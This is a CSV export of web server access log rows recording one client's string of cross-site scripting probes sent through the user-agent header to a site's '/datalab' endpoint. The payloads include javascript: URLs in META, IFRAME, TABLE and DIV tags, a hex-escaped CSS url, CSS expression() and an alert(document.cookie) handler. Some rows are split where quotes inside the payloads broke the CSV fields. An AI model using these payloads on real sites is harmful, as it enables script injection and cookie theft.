"","X1","X2","X3","X4","X5","X6","X7","X8","X9","X10"
"378","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:26 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <XSS STYLE=""behavior: url(xss.htc);""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","56"
"379","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:27 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <XSS STYLE=""behavior: url(xss.htc);""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","54"
"380","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:27 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <XSS STYLE=""behavior: url(xss.htc);""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"381","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:31 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <XSS STYLE=""behavior: url(xss.htc);""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","267"
"382","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:31 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <XSS STYLE=""behavior: url(xss.htc);""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"383","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:31 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <XSS STYLE=""behavior: url(xss.htc);""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","8"
"384","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:48 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"385","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:49 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","54"
"386","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:49 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","12"
"387","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:51 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","202"
"388","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:52 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"389","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:20:52 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <U+00BC>script<U+00BE>alert(°ÈXSS°È)<U+00BC>/script<U+00BE> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"390","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:21:08 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=javascript:alert('XSS');"">"
"391","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:21:09 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=javascript:alert('XSS');"">"
"392","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:21:09 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=javascript:alert('XSS');"">"
"393","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:23:09 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=javascript:alert('XSS');"">"
"394","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:09 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=javascript:alert('XSS');"">"
"395","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:27 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=data:text/html"
"396","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:27 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=data:text/html"
"397","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:27 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=data:text/html"
"398","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:28 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=data:text/html"
"399","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:28 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=data:text/html"
"400","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:28 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;url=data:text/html"
"401","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:52 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;"
"402","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:52 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;"
"403","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:25:52 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;"
"404","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:27:52 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;"
"405","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:29:52 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <META HTTP-EQUIV=""refresh","CONTENT=""0;"
"406","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:30:11 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","51"
"407","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:30:11 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","87"
"408","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:30:11 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","8"
"409","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:32:11 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"410","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:12 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IFRAME SRC=""javascript:alert('XSS');""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"411","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:35 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","38"
"412","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:36 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","13"
"413","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:36 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"414","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:37 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","259"
"415","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:37 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","30"
"416","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:37 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","18"
"417","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:52 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"418","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:52 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"419","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:34:53 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"420","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:36:52 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"421","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:38:54 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"422","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:39:18 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","18"
"423","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:39:20 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","14"
"424","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:39:20 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","317"
"425","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:41:21 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"426","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:43:22 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <TABLE BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"427","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:43:41 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"428","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:43:42 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"429","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:43:43 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"430","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:45:42 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"431","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:47:44 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <TABLE><TD BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"432","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:48:01 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"433","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:48:01 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"434","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:48:01 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"435","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:50:01 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"436","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:52:02 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image: url(javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"437","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:52:19 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","546"
"438","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:52:29 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1832"
"439","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:52:29 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","7689"
"440","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:54:22 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"441","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:56:25 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"442","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:56:48 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"443","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:56:49 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","10"
"444","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:56:51 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"445","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:16:58:49 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"446","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:00:50 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"447","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:01:08 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <DIV STYLE=""width: expression(alert('XSS'));""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"448","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:01:09 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <DIV STYLE=""width: expression(alert('XSS'));""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"449","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:01:09 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <DIV STYLE=""width: expression(alert('XSS'));""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"450","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:03:10 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <DIV STYLE=""width: expression(alert('XSS'));""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"451","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:05:11 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <DIV STYLE=""width: expression(alert('XSS'));""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"452","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:05:33 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"453","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:05:34 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"454","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:17:05:34 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]--> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
